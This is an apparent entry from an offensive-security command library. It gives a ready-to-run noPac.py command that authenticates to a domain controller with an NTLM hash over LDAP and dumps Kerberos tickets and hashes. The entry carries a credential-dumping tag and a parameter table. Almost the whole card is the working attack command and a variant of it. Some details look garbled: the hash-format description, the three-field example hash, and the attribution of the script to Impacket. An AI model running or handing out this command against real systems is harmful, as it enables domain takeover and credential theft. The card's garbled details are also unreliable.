---
id: 72d07934-a169-4ef7-a0ae-965ae1b8ba8c
name: dump-nopac-credentials-with-python-nopac
type: command
executor: bash
data: >-
  python noPac.py 'domain.local/user' -hashes
  ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump
output: null
created_at: '2023-04-06T03:56:03.186024+00:00'
updated_at: '2023-04-10T20:36:11.698743+00:00'
platforms:
  - Linux
tags:
  - credential-dumping
  - kerberos
verified: true
validated: true
---

# dump-nopac-credentials-with-python-nopac

## Command

```bash
python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump
```

## Description

Dumps noPAC Kerberos credentials from a domain controller using Impacket's noPac.py, authenticating with NTLM hash over LDAP.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 'domain.local/user' | Domain/user for authentication | Yes |
| -hashes | NTLM hash (format :lmnt:ntlm) | Yes |
| -dc-ip | Domain controller IP | Yes |
| -use-ldap | Use LDAP protocol | Yes |
| -dump | Dump credentials to output | Yes |

## Examples

### Basic Usage

```bash
python noPac.py 'corp/user' -hashes ':aabbcc:31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 192.168.1.10 -use-ldap -dump
```

## Expected Output

Extracted tickets/hashes, e.g., "Impacket v0.9.24 - noPac... Dumping TGS for service."

## Related

- [[procedures/Sam-Account-Name-Spoofing-for-User-Impersonation]]
- [[tools/Impacket]]
